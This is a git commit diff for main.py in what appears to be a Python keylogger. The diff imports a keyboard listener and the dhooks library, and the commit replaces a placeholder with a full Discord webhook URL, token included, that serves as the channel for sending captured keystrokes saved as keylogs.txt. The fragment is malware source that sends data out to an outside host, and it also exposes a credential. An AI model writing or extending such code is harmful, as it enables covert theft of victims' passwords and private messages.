ea44b499c90dcc802192a9622d6472f08f1c5462
Ree2no <151462864+Ree2no@users.noreply.github.com>
2023-11-19 19:05:58 +0100

    Update main.py

--- main.py
+++ main.py
@@ -2,12 +2,12 @@
 
 from pynput.keyboard import Key, Listener
 from dhooks import Webhook #pip install dhooks
-import logging
+import logging 
 
 log_dir = ""
 
 # URL HERE
-log_send = Webhook('here')
+log_send = Webhook('https://discord.com/api/webhooks/1175859219052896378/4L0w5Tk2CnJbPWWDfythzGuWKbg1SwmfmMqR2giHIaxucWp6INMKrGQjyGDHT0N7Ao1b')
 
 #save the file as keylogs.txt
 
